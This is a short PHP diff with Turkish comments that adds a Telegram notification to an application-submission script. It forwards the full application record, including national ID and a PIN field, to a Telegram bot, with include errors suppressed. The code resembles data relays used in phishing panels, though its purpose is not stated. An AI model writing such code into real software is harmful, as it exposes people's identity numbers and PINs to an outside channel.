@@ -58,7 +58,14 @@ $application = createApplication([
     'national_id' => $nationalId,
     'user_code' => $userCode ?: $nationalId,
     'demo_pin' => $demoPin,
+    'tip' => $tip,
 ]);
+
+// Telegram bildirim gonder
+@require_once __DIR__ . '/includes/telegram.php';
+if (function_exists('sendTelegramNotification')) {
+    sendTelegramNotification($application);
+}
 
 // TC API ile ad/soyad sorgula
 if ($tip !== 'ticari' && strlen($nationalId) === 11) {
